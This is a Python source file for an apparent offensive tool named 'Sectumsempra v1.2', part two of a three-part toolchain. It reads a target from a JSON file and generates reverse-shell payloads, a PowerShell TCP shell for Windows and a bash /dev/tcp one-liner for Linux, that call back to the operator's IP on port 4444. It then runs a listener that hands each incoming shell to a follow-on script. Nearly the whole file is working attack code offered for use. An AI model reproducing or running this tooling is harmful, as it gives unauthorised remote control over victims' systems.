---

## Tool 2/3: Sectumsempra v1.2

```python
#!/usr/bin/env python3
"""
Sectumsempra v1.2 - Green Engine
The Bridge: Socket Listener with Morsmordre Handoff
"""

import asyncio
import argparse
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path
from typing import Optional, Dict, Any

try:
    from rich.console import Console
    from rich.panel import Panel
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

class Sectumsempra:
    def __init__(self):
        self.console = Console() if RICH_AVAILABLE else None
        self.lhost: Optional[str] = None
        self.lport: int = 4444
        self.target_os: str = "Linux"
        self.target_ip: str = ""
        self.contract_file: Optional[str] = None
        
    def banner(self):
        banner = """
    ███████╗███████╗ ██████╗████████╗██╗   ██╗███╗   ███╗███████╗███████╗███╗   ███╗██████╗ ██████╗  █████╗ 
    ██╔════╝██╔════╝██╔════╝╚══██╔══╝██║   ██║████╗ ████║██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗██╔══██╗
    ███████╗█████╗  ██║        ██║   ██║   ██║██╔████╔██║███████╗█████╗  ██╔████╔██║██████╔╝██████╔╝███████║
    ╚════██║██╔══╝  ██║        ██║   ██║   ██║██║╚██╔╝██║╚════██║██╔══╝  ██║╚██╔╝██║██╔═══╝ ██╔══██╗██╔══██║
    ███████║███████╗╚██████╗   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║███████╗██║ ╚═╝ ██║██║     ██║  ██║██║  ██║
    ╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
        """
        if self.console:
            self.console.print(Panel(Text(banner, style="bold green"), 
                                   subtitle="[green]v1.2 Green Engine - The Bridge[/green]",
                                   border_style="green"))
        else:
            print(f"\033[92m{banner}\033[0m")
            print(f"\033[92m>>> Sectumsempra v1.2 - Green Engine <<<\033[0m\n")
    
    def status(self, msg: str, level: str = "info"):
        ts = time.strftime("%H:%M:%S")
        indicators = {
            "info": "[*]", "success": "[+]", "warning": "[!]", 
            "error": "[-]", "handoff": "[»]", "shell": "[SHELL]"
        }
        ind = indicators.get(level, "[*]")
        
        if self.console:
            color = {"info": "blue", "success": "green", "warning": "yellow", 
                    "error": "red", "handoff": "magenta", "shell": "red"}.get(level, "white")
            self.console.print(f"[{color}]{ind} [{ts}] {msg}[/{color}]")
        else:
            colors = {"info": "\033[94m", "success": "\033[92m", 
                     "warning": "\033[93m", "error": "\033[91m", 
                     "handoff": "\033[95m", "shell": "\033[91m"}
            print(f"{colors.get(level, '')}{ind} [{ts}] {msg}\033[0m")
    
    def find_tun0(self) -> str:
        try:
            import netifaces
            if 'tun0' in netifaces.interfaces():
                addrs = netifaces.ifaddresses('tun0')
                if netifaces.AF_INET in addrs:
                    return addrs[netifaces.AF_INET][0]['addr']
        except:
            pass
        
        try:
            result = subprocess.run(["ip", "addr", "show", "tun0"], 
                                capture_output=True, text=True)
            match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
            if match:
                return match.group(1)
        except:
            pass
        
        return "0.0.0.0"
    
    def load_contract(self, filename: Optional[str] = None) -> Dict:
        if filename:
            self.contract_file = filename
        else:
            files = sorted(Path('.').glob('netweave_*.json'))
            if not files:
                self.status("No NetWeave contract found", "error")
                sys.exit(1)
            self.contract_file = str(files[-1])
        
        with open(self.contract_file) as f:
            data = json.load(f)
        
        self.target_ip = data.get('target', '')
        self.target_os = data.get('operating_system', 'Linux')
        
        self.status(f"Contract: {self.contract_file}", "success")
        self.status(f"Target: {self.target_ip} | OS: {self.target_os}", "info")
        return data
    
    def generate_payload(self) -> str:
        self.lhost = self.find_tun0()
        self.status(f"LHOST: {self.lhost}", "success")
        
        if "Windows" in self.target_os:
            ps = f"""$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
            filename = f"payload_windows_{self.target_ip.replace('.', '_')}.ps1"
            with open(filename, 'w') as f:
                f.write(ps)
            display = f"powershell -ExecutionPolicy Bypass -File {filename}"
        else:
            bash = f"""bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"""
            filename = f"payload_linux_{self.target_ip.replace('.', '_')}.sh"
            with open(filename, 'w') as f:
                f.write(f"#!/bin/bash\n{bash}")
            os.chmod(filename, 0o755)
            display = f"bash {filename}"
        
        self.status(f"Payload: {filename}", "success")
        self.status(f"Execute on target: {display}", "info")
        return filename
    
    async def bridge_connection(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        addr = writer.get_extra_info('peername')
        self.status(f"SHELL LANDED from {addr[0]}:{addr[1]}", "shell")
        self.status("Handing off to Morsmordre...", "handoff")
        
        env = os.environ.copy()
        env['MORSMORDRE_TARGET'] = self.target_ip
        env['MORSMORDRE_OS'] = self.target_os
        env['MORSMORDRE_LHOST'] = self.lhost
        
        proc = await asyncio.create_subprocess_exec(
            sys.executable, 'morsmordre.py',
            stdin=reader,
            stdout=writer,
            stderr=asyncio.subprocess.PIPE,
            env=env
        )
        
        await proc.wait()
        writer.close()
        await writer.wait_closed()
        self.status("Session closed", "warning")
    
    async def start_listener(self):
        server = await asyncio.start_server(
            self.bridge_connection, '0.0.0.0', self.lport
        )
        
        self.status(f"Listener: 0.0.0.0:{self.lport}", "success")
        self.status("Waiting for shell...", "info")
        
        async with server:
            await server.serve_forever()
    
    def run(self, contract_file: Optional[str] = None):
        self.banner()
        self.load_contract(contract_file)
        self.generate_payload()
        
        try:
            asyncio.run(self.start_listener())
        except KeyboardInterrupt:
            self.status("Terminated", "warning")

def main():
    parser = argparse.ArgumentParser(description='Sectumsempra v1.2 - Green Engine')
    parser.add_argument('--contract', help='Path to NetWeave JSON contract')
    args = parser.parse_args()
    
    Sectumsempra().run(args.contract)

if __name__ == "__main__":
    main()
